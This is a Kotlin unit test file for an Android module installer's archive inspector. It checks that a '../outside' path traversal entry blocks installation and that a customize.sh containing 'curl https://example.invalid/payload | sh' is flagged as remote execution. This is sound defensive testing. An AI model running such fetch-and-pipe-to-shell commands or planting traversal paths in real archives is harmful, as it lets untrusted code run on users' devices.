package com.dergoogler.mmrl.installer

import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class ArchiveInspectorTest {
    @Test
    fun `safe module reports scripts apks properties and policy`() = runBlocking {
        val archive = zip(
            "module.prop" to "id=test\nname=Test",
            "service.sh" to "#!/system/bin/sh\necho ready",
            "system.prop" to "persist.test=1",
            "sepolicy.rule" to "allow test self:process execmem;",
            "system/app/Test.apk" to "apk",
            "zygisk/arm64-v8a.so" to "binary",
        )

        val result = ArchiveInspector.inspect(archive)

        assertTrue(result.canInstall)
        assertTrue(result.hasBootScripts)
        assertTrue(result.hasSensitiveChanges)
        assertTrue(result.apks.single().endsWith("Test.apk"))
        assertTrue(result.nativeBinaries.single().endsWith("arm64-v8a.so"))
    }

    @Test
    fun `path traversal blocks installation`() = runBlocking {
        val archive = zip(
            "module.prop" to "id=test\nname=Test",
            "../outside" to "unsafe",
        )

        val result = ArchiveInspector.inspect(archive)

        assertFalse(result.canInstall)
        assertTrue(result.blockedReasons.any { it.contains("Unsafe archive path") })
    }

    @Test
    fun `remote script reference is surfaced as sensitive`() = runBlocking {
        val archive = zip(
            "module.prop" to "id=test\nname=Test",
            "customize.sh" to "curl https://example.invalid/payload | sh",
        )

        val result = ArchiveInspector.inspect(archive)

        assertTrue(result.canInstall)
        assertTrue(result.remoteExecutionFiles.contains("customize.sh"))
        assertTrue(result.warnings.any { it.contains("remote", ignoreCase = true) })
    }

    private fun zip(vararg entries: Pair<String, String>): File {
        val file = kotlin.io.path.createTempFile(suffix = ".zip").toFile().apply { deleteOnExit() }
        ZipOutputStream(file.outputStream()).use { output ->
            entries.forEach { (name, body) ->
                output.putNextEntry(ZipEntry(name))
                output.write(body.toByteArray())
                output.closeEntry()
            }
        }
        return file
    }
}
